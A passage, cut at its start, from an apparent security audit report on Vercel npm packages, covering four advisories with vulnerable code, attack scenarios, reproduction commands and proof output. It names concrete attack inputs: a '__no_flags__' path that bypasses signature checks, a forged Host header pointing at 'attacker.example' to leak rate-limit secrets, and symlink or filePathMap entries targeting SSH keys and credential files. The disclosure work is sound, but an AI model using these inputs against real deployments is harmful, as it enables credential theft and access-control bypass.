#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Emergency Kill-Switch Lockout During an Incident:** A single `502`/`503` response carrying `x-datafile-Updated-At: 9999999999999` poisons `datafileUpdatedAtWatermark`. When engineers later flip an emergency kill-switch in Vercel Flags, the running application ignores the bundled/fallback datafile (`updatedAt: 1700000100000 <= 9999999999999`) and keeps the vulnerable feature enabled (`stale-compromised-variant`).
* **Scenario B — Redirect Credential Leak on `FLAGS_SERVICE_URL` (`redirect: 'manual'` Missing):** If `streamResponse()` receives a `302` redirect from a custom or proxy `FLAGS_SERVICE_URL`, `fetch()` follows the redirect without `redirect: 'manual'`.
* **Scenario C — Persistent Multi-Worker Drift in Long-Lived Node.js Servers:** Poisoned workers permanently serve stale feature flags while healthy workers serve updated flags, causing inconsistent authorization and checkout behavior.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Inspect streamResponse and readBundledDefinitions in published @vercel/flags-core@1.10.2
nl -ba /home/community-user/targets/vercel-bounty-audit-20261027/live-dist-verify/node_modules/@vercel/flags-core/dist/index.js | sed -n '465,516p'

# 2. Run the Live @vercel/flags-core@1.10.2 End-to-End Verification Harness
node /home/community-user/targets/vercel-bounty-audit-20261027/pocs/verify_npm_stable_tarballs_20261028.mjs
git apply --check /home/community-user/targets/vercel-bounty-audit-20261027/patches/FINDING-06-flags-core-controller-stream-hardening.patch
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "VERCEL-FLAGS-CORE-06": {
    "RED": {
      "package_tested": "@vercel/flags-core@1.10.2",
      "initial_flag_value": "stale-compromised-variant",
      "bundled_legitimate_update_timestamp": 1700000100000,
      "poisoned_header_sent_on_503": "9999999999999",
      "flag_value_after_watermark_poisoning": "stale-compromised-variant",
      "legitimate_bundled_update_ignored": true
    },
    "GREEN": {
      "requires_res_ok_and_valid_datafile_before_watermark_update": true,
      "rejects_future_timestamp_skew": true,
      "legitimate_bundled_update_ignored": false
    }
  }
}
```


---

### III.43 — vercel/flags (`flags <= 4.4.0 (verified on published npm flags@4.4.0)`) — Vercel `flags@4.4.0` `deserialize()` Unauthenticated `__no_flags__` Sentinel Early-Return Bypassing Compact JWS Signature Verification (`VERCEL-FLAGS-05`) (`CWE-347`, CVSS `6.5 Medium`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `vercel/flags` (`npm / Node.js: flags`)
* **Affected Versions & Components:** `<= 4.4.0 (verified on published npm flags@4.4.0)` — `packages/flags/src/next/precompute.ts:206-214`, `packages/flags/dist/next/index.js:119-125` (`deserialize`)
* **Vulnerability Class & Score:** `CWE-347` — **CVSS v3.1: `6.5 Medium`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N`)
* **Standalone Sniper Advisory:** [`docs/advisories/ja/43-VERCEL-FLAGS-05-PRECOMPUTE-NO-FLAGS-SENTINEL-JWS-BYPASS.md`](advisories/ja/43-VERCEL-FLAGS-05-PRECOMPUTE-NO-FLAGS-SENTINEL-JWS-BYPASS.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — Unconditional Early Return Before JWS Verification (`packages/flags/src/next/precompute.ts:206-214`):** `serialize()` returns `'__no_flags__'` only when `flags.length === 0`. However, `deserialize(flags, code, secret)` checks `if (code === '__no_flags__') return {};` at the very top of the function WITHOUT checking `if (flags.length === 0)` and BEFORE invoking `compactVerify(code, encodedSecret)`.
2. **Step 2 — Direct URL Segment Access in Next.js App Router (`app/[code]/...`):** In Next.js applications using Flags SDK precomputation (`app/[code]/checkout/page.tsx`), the `[code]` route parameter is normally generated and JWS-signed by Edge Middleware (`serialize(flags, values, secret)`). Because `[code]` is a URL path segment, an unauthenticated user can directly request `/__no_flags__/checkout` (or bypass middleware via path/header conditions).
3. **Step 3 — Fallback `flag.decide()` Execution Without Edge Context:** When `deserialize()` returns `{}` for `code = '__no_flags__'`, `getPrecomputed(flag, precomputeGroup, code)` sees `parsed[flag.key] === undefined` and falls back to re-running `flag.decide()` inside the Node/Page render context (where Edge geo/IP/middleware overrides are absent), flipping Edge-blocked flags (`true` instead of Edge-precomputed `false`).

```typescript
// File: packages/flags/src/next/precompute.ts (lines 206-214)
export async function deserialize(
  flags: ReadonlyArray<Flag<any, any>>,
  code: string,
  secret: string | undefined = process.env.FLAGS_SECRET,
): Promise<Record<string, any>> {
  if (!secret) throw new Error('flags: deserialize was called without a secret');
  // BUG: Returns {} BEFORE JWS signature verification even when flags.length > 0!
  if (code === '__no_flags__') return {};
  // ... JWS compactVerify() only runs below this line
}
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Bypassing Edge Middleware Geo/WAF Gating in Precomputed Routes:** Edge Middleware precomputes `vipCheckoutFlag = false` for an untrusted IP/region and signs it into a Compact JWS `[code]` segment. The client navigates directly to `/__no_flags__/checkout`, causing `deserialize()` to skip JWS verification, return `{}`, and trigger the page-level `decide()` fallback (`true`).
* **Scenario B — A/B Price & Promotion Tier Manipulation:** A user locked into a control pricing cohort by Edge Middleware replaces the signed JWS segment in the URL or rewrite header with `__no_flags__`, forcing re-evaluation without a valid `FLAGS_SECRET` signature.
* **Scenario C — Cache-Key Fragmentation & Origin Re-Decide Amplification:** Requesting `/__no_flags__/...` across precomputed ISR routes forces `getPrecomputed()` to execute asynchronous `flag.decide()` calls on every render instead of reading O(1) signed precomputed values.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Inspect deserialize in published flags@4.4.0
nl -ba /home/community-user/targets/vercel-bounty-audit-20261027/live-dist-verify/node_modules/flags/dist/next/index.js | sed -n '115,155p'

# 2. Run the Live flags@4.4.0 End-to-End Verification Harness
node /home/community-user/targets/vercel-bounty-audit-20261027/pocs/verify_npm_stable_tarballs_20261028.mjs
git apply --check /home/community-user/targets/vercel-bounty-audit-20261027/patches/FINDING-05-flags-precompute-no-flags-sentinel-bypass.patch
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "VERCEL-FLAGS-05": {
    "RED": {
      "package_tested": "flags@4.4.0",
      "legitimate_signed_code_prefix": "eyJhbGciOiJkaXIiLCJlbmMiOiJBMjU2R0NNIn0..",
      "legitimate_precomputed_value": false,
      "forged_code_passed": "__no_flags__",
      "deserialize_output_for_no_flags": {},
      "getPrecomputed_value_with_no_flags_sentinel": true,
      "random_tampered_token_rejected": true
    },
    "GREEN": {
      "sentinel_rejected_when_flags_non_empty": true,
      "getPrecomputed_with_no_flags_throws": true
    }
  }
}
```


---

### III.44 — vercel/firewall (`@vercel/firewall <= 1.2.6 (verified on published npm @vercel/firewall@1.2.6 & Go ipc-proxy)`) — Vercel `@vercel/firewall@1.2.6` `checkRateLimit()` Untrusted `Host` Header / `region` SSRF Exfiltrating `VF_RATE_LIMIT_SECRET` & Fail-Open Rate-Limit Bypass (`VERCEL-FIREWALL-01`) (`CWE-918 / CWE-200 / CWE-636`, CVSS `7.2 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `vercel/firewall` (`npm / Node.js & Go: @vercel/firewall`)
* **Affected Versions & Components:** `<= 1.2.6 (verified on published npm @vercel/firewall@1.2.6 & Go ipc-proxy)` — `packages/firewall/src/rate-limit.ts:138-183, 211-285`, `cmd/ipc-proxy/client.go:34-41, 79-97`
* **Vulnerability Class & Score:** `CWE-918 / CWE-200 / CWE-636` — **CVSS v3.1: `7.2 High`** (`CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:L/A:N`)
* **Standalone Sniper Advisory:** [`docs/advisories/ja/44-VERCEL-FIREWALL-01-CHECKRATELIMIT-HOST-SSRF-SECRET-LEAK-AND-FAIL-OPEN.md`](advisories/ja/44-VERCEL-FIREWALL-01-CHECKRATELIMIT-HOST-SSRF-SECRET-LEAK-AND-FAIL-OPEN.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — Unvalidated `Host` Header Interpolation Into Outbound HTTPS Authority (`packages/firewall/src/rate-limit.ts:138-167, 224`):** When `process.env.VERCEL_ENV !== 'production'` (such as staging, preview, self-hosted Kubernetes/Docker, or custom reverse-proxy deployments where `request` or `headers` is passed to `checkRateLimit()`), `resolveFirewallHost()` extracts `request.headers.get('host')` and constructs `const endpoint = \`https://${firewallHost}${pathPrefix}/.well-known/vercel/rate-limit/check\``.
2. **Step 2 — Exfiltration of `VF_RATE_LIMIT_SECRET` and `x-vercel-oidc-token` (`rate-limit.ts:169-183`):** `buildAuthHeaders()` attaches `x-vercel-rate-limit-secret: process.env.VF_RATE_LIMIT_SECRET` and `x-vercel-oidc-token` to that outbound `POST` request, delivering both secrets directly to the attacker's host.
3. **Step 3 — Universal Fail-Open Rate-Limit Bypass (`{ rateLimited: false }`) & Go `ipc-proxy` Uninterpolated `api-%s.vercel.com` Bug (`rate-limit.ts:242-284`, `cmd/ipc-proxy/client.go:34-41`):** Whenever the outbound request fails or returns `>= 400` (e.g., when an attacker sends `Host: localhost/@attacker` even in `VERCEL_ENV=production`), `callRemoteRateLimitAPI()` catches the error and returns `{ rateLimited: false, error: 'not_found' }`, completely bypassing rate limiting! Additionally, `cmd/ipc-proxy/client.go:38` assigns `endpoint = apiEndpointFmt` (`"https://api-%s.vercel.com/v1/rate-limit"`) as a literal string with a raw `%s` instead of `fmt.Sprintf(apiEndpointFmt, region)`.

```typescript
// File: packages/firewall/src/rate-limit.ts (lines 138-167, 211-285)
function resolveFirewallHost(options: RateLimitOptions): string | null {
  if (process.env.VERCEL_ENV !== 'production') {
    const host = extractHostFromHeaders(options.headers) ?? extractHostFromRequest(options.request);
    if (host) return host; // BUG: Unvalidated Host header used directly as HTTPS target authority!
  }
  return process.env.VERCEL_URL || null;
}
// In callRemoteRateLimitAPI():
const endpoint = `https://${firewallHost}${pathPrefix}/.well-known/vercel/rate-limit/check`;
const response = await fetch(endpoint, { method: 'POST', headers: authHeaders, body: ... });
// BUG: On any error or >=400 status, fails open with { rateLimited: false }!
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Staging / Preview / Self-Hosted `VF_RATE_LIMIT_SECRET` & OIDC Token Exfiltration:** An application calls `await checkRateLimit('login-limit', { request })`. An attacker sends `Host: 127.0.0.1:44123` (or `attacker.example`). `@vercel/firewall` sends `POST https://attacker.example/.well-known/vercel/rate-limit/check` carrying `x-vercel-rate-limit-secret: rl_secret_LIVE_99887766` and `x-vercel-oidc-token`.
* **Scenario B — Production Brute-Force / OTP Rate-Limit Bypass via `Host` Path/Userinfo Injection (`rateLimited: false`):** Even when `VERCEL_ENV=production` uses `api-${region}.vercel.com`, `extractHost()` passes the inbound `Host` header into the request metadata/URL path (`/@bypass`), causing a `400`/`404` response that `checkRateLimit()` catches and turns into `{ rateLimited: false }`, allowing unlimited OTP/password brute-forcing.
* **Scenario C — Go `ipc-proxy` Regional Endpoint Failure (`https://api-%s.vercel.com/v1/rate-limit`):** Setting `VERCEL_REGION=iad1` without `FIREWALL_API_ENDPOINT` causes `cmd/ipc-proxy/client.go:38` to dial the literal unformatted string `https://api-%s.vercel.com/v1/rate-limit`, failing every regional rate-limit check.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Inspect rate-limit.js in published @vercel/firewall@1.2.6 and cmd/ipc-proxy/client.go
nl -ba /home/community-user/targets/vercel-bounty-audit-20261027/live-dist-verify/node_modules/@vercel/firewall/dist/rate-limit.js | sed -n '90,220p'

# 2. Run the Live @vercel/firewall@1.2.6 End-to-End Verification Harness
node /home/community-user/targets/vercel-bounty-audit-20261027/pocs/verify_npm_stable_tarballs_20261028.mjs
git apply --check /home/community-user/targets/vercel-bounty-audit-20261027/patches/FINDING-01-firewall-host-region-ssrf-and-ipc-proxy.patch
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "VERCEL-FIREWALL-01": {
    "RED": {
      "package_tested": "@vercel/firewall@1.2.6",
      "attacker_received_request": true,
      "leaked_rate_limit_secret": "rl_secret_LIVE_99887766",
      "leaked_oidc_token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.LIVE_OIDC_PAYLOAD",
      "fail_open_result_on_error": {
        "rateLimited": false,
        "error": "not_found"
      }
    },
    "GREEN": {
      "untrusted_host_and_region_rejected": true,
      "attacker_received_request": false,
      "go_ipc_proxy_sprintf_formatted": true
    }
  }
}
```


---

### III.45 — vercel/vercel (`@vercel/client <= 18.10.0 (verified on published npm @vercel/client@18.10.0)`) — Vercel `@vercel/client@18.10.0` Prebuilt `.vc-config.json` `filePathMap` Arbitrary Host File Read & `.next/required-server-files.json` Local `.env` Secret Upload (`VERCEL-CLIENT-08A`) (`CWE-200 / CWE-706`, CVSS `5.0 Medium`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `vercel/vercel` (`npm / Node.js: @vercel/client`)
* **Affected Versions & Components:** `<= 18.10.0 (verified on published npm @vercel/client@18.10.0)` — `packages/client/src/utils/hashes.ts:115-167`, `packages/client/src/deploy.ts:127-195` (`filesFromFilePathMap`)
* **Vulnerability Class & Score:** `CWE-200 / CWE-706` — **CVSS v3.1: `5.0 Medium`** (`CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:C/C:H/I:N/A:N`)
* **Standalone Sniper Advisory:** [`docs/advisories/ja/45-VERCEL-CLIENT-08A-PREBUILT-FILEPATHMAP-DOTNEXT-ENV-SECRET-UPLOAD.md`](advisories/ja/45-VERCEL-CLIENT-08A-PREBUILT-FILEPATHMAP-DOTNEXT-ENV-SECRET-UPLOAD.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — Unconfined `path.resolve(cwd, filePath)` in `filesFromFilePathMap()` (`packages/client/src/utils/hashes.ts:115-167`):** When `prebuilt: true` (`vercel deploy --prebuilt`), `@vercel/client` parses `.vercel/output/functions/**/.vc-config.json` and iterates over `Object.entries(vcConfig.filePathMap)`. For each entry, it computes `const fsPath = path.resolve(cwd, filePath)` and reads the file (`fs.readFile(fsPath)`) without checking that `fsPath` is inside `cwd` or filtering against `.vercelignore`.
2. **Step 2 — Default Next.js `.next/required-server-files.json` Secret Leakage:** Even on an unmodified Next.js build, `.vc-config.json`'s `filePathMap` includes `.next/required-server-files.json`, which serializes local `config.env` values from `.env` / `.env.local` despite `.vercelignore` excluding `.env*`.
3. **Step 3 — CI/CD Prebuilt Artifact Poisoning (`POST /v2/files` Upload):** If a CI build step or reusable workflow generates `.vercel/output` and hands it to a deployment job running `vercel deploy --prebuilt --token $VERCEL_TOKEN`, any `../../../../etc/passwd` or `~/.aws/credentials` entry in `filePathMap` is SHA-1 hashed and uploaded to Vercel's `/v2/files` deployment API.

```typescript
// File: packages/client/src/utils/hashes.ts (lines 115-167)
export async function filesFromFilePathMap(
  filePathMap: Record<string, string>,
  cwd: string
): Promise<Map<string, DeploymentFile>> {
  for (const [funcPath, filePath] of Object.entries(filePathMap)) {
    // BUG: No check that fsPath stays within cwd, and .vercelignore is never applied!
    const fsPath = path.resolve(cwd, filePath);
    const data = await fs.readFile(fsPath);
    // ... packages data for upload to POST /v2/files
  }
}
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Default `vercel build && vercel deploy --prebuilt` `.env.local` Secret Leakage:** A developer adds `.env*` to `.vercelignore` expecting local secrets to stay off the deployment server, but `filePathMap` pulls `.next/required-server-files.json` containing `DATABASE_URL` and `STRIPE_SECRET_KEY` into the uploaded function bundle.
* **Scenario B — Split CI/CD Pipeline (`build` PR Artifact -> `deploy --prebuilt` Privileged Job) Host Credential Exfiltration:** An unprivileged PR build job outputs `.vercel/output` as a workflow artifact with `filePathMap: { "leaked.txt": "/home/runner/.npmrc" }`. The privileged deploy job runs `vercel deploy --prebuilt`, uploading the runner's credentials into the deployed function.
* **Scenario C — Monorepo Shared Cache / Turborepo Remote Cache Poisoning:** A poisoned `.vc-config.json` restored from a shared build cache exfiltrates CI environment files during prebuilt deployment.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Inspect filesFromFilePathMap in published @vercel/client@18.10.0
nl -ba /home/community-user/targets/vercel-bounty-audit-20261027/live-dist-verify/node_modules/@vercel/client/dist/utils/hashes.js | sed -n '85,145p'

# 2. Run the Live @vercel/client@18.10.0 End-to-End Verification Harness
node /home/community-user/targets/vercel-bounty-audit-20261027/pocs/verify_npm_stable_tarballs_20261028.mjs
git apply --check /home/community-user/targets/vercel-bounty-audit-20261027/patches/FINDING-08-client-prebuilt-path-and-symlink-confinement.patch
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "VERCEL-CLIENT-08A": {
    "RED": {
      "package_tested": "@vercel/client@18.10.0",
      "outside_host_file_read_via_filePathMap": true,
      "dotnext_required_server_files_env_uploaded": true,
      "uploaded_payload_excerpt": "SUPER_SECRET_HOST_TOKEN=host_secret_value_12345"
    },
    "GREEN": {
      "outside_cwd_filePathMap_rejected": true,
      "outside_host_file_read_via_filePathMap": false
    }
  }
}
```


---

### III.46 — vercel/vercel (`@vercel/client <= 18.10.0 (verified on published npm @vercel/client@18.10.0)`) — Vercel `@vercel/client@18.10.0` Prebuilt `config.bulkRedirectsPath` Symlink Escape & `.vercelignore` Bypass Uploading Arbitrary Host Files (`VERCEL-CLIENT-08B`) (`CWE-59 / CWE-200`, CVSS `5.0 Medium`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `vercel/vercel` (`npm / Node.js: @vercel/client`)
* **Affected Versions & Components:** `<= 18.10.0 (verified on published npm @vercel/client@18.10.0)` — `packages/client/src/utils/index.ts:116-148`, `packages/client/src/deploy.ts:145-195` (`buildFileTree` / `bulkRedirectsPath`)
* **Vulnerability Class & Score:** `CWE-59 / CWE-200` — **CVSS v3.1: `5.0 Medium`** (`CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:C/C:H/I:N/A:N`)
* **Standalone Sniper Advisory:** [`docs/advisories/ja/46-VERCEL-CLIENT-08B-PREBUILT-BULKREDIRECTSPATH-SYMLINK-AND-IGNORE-BYPASS.md`](advisories/ja/46-VERCEL-CLIENT-08B-PREBUILT-BULKREDIRECTSPATH-SYMLINK-AND-IGNORE-BYPASS.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — Unvalidated `config.bulkRedirectsPath` & Symlink Following in `buildFileTree()` (`packages/client/src/utils/index.ts:116-148`):** In `buildFileTree()`, when `prebuilt` is `true`, `@vercel/client` reads `.vercel/output/config.json` and resolves `const bulkRedirectsRoot = join(cwd, config.bulkRedirectsPath)`. It then recursively walks `bulkRedirectsRoot` using `fs.stat()` (which transparently dereferences symlinks to files/directories outside `cwd`) without checking `fs.realpath()` confinement.
2. **Step 2 — Complete `.vercelignore` Bypass in Prebuilt Mode:** The `prebuilt` branch of `buildFileTree()` passes a no-op ignore filter when enumerating `bulkRedirectsPath`, uploading sensitive files (`id_rsa`, `.env.production`) even when explicitly listed in `.vercelignore`.
3. **Step 3 — External File Packaging & Upload to `/v2/files`:** Every file discovered under the symlinked or traversed `bulkRedirectsPath` is hashed (`hashes()`) and uploaded to Vercel's `/v2/files` deployment API.

```typescript
// File: packages/client/src/utils/index.ts (lines 116-148)
if (config?.bulkRedirectsPath) {
  const bulkRedirectsPath = join(cwd, config.bulkRedirectsPath);
  // BUG: No realpath confinement check and .vercelignore is not applied;
  // readdir/stat follows symlinks pointing outside cwd!
  const bulkRedirectFiles = await readdir(bulkRedirectsPath, []);
  fileList.push(...bulkRedirectFiles);
}
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Symlink inside `bulkRedirectsPath` Exfiltrating Host SSH/Cloud Credentials During `vercel deploy --prebuilt`:** A prebuilt output directory sets `"bulkRedirectsPath": ".vercel/output/redirects"` containing a symlink `leak.json -> /home/runner/.ssh/id_rsa`. `buildFileTree()` follows the symlink via `fs.stat()` and uploads the private key to the deployment.
* **Scenario B — Relative Path Traversal in `.vercel/output/config.json` (`"bulkRedirectsPath": "../../secrets"`):** Setting `bulkRedirectsPath` to a parent directory walks and uploads all files in that host directory.
* **Scenario C — `.vercelignore` Bypass for Local Secret Files:** Files explicitly excluded by `.vercelignore` are still packaged when referenced via `bulkRedirectsPath`.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Inspect buildFileTree in published @vercel/client@18.10.0
nl -ba /home/community-user/targets/vercel-bounty-audit-20261027/live-dist-verify/node_modules/@vercel/client/dist/utils/index.js | sed -n '90,145p'

# 2. Run the Live @vercel/client@18.10.0 End-to-End Verification Harness
node /home/community-user/targets/vercel-bounty-audit-20261027/pocs/verify_npm_stable_tarballs_20261028.mjs
git apply --check /home/community-user/targets/vercel-bounty-audit-20261027/patches/FINDING-08-client-prebuilt-path-and-symlink-confinement.patch
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "VERCEL-CLIENT-08B": {
    "RED": {
      "package_tested": "@vercel/client@18.10.0",
      "bulkRedirectsPath_symlink_followed_outside_cwd": true,
      "outside_symlink_target_packaged_in_fileList": true,
      "uploaded_payload_excerpt": "OUTSIDE_SYMLINK_SECRET=top_secret_symlink_data_999"
    },
    "GREEN": {
      "bulkRedirectsPath_confined_to_cwd_realpath": true,
      "outside_symlink_target_packaged_in_fileList": false
    }
  }
}
```

<!-- VERCEL-ADVISORIES-END -->
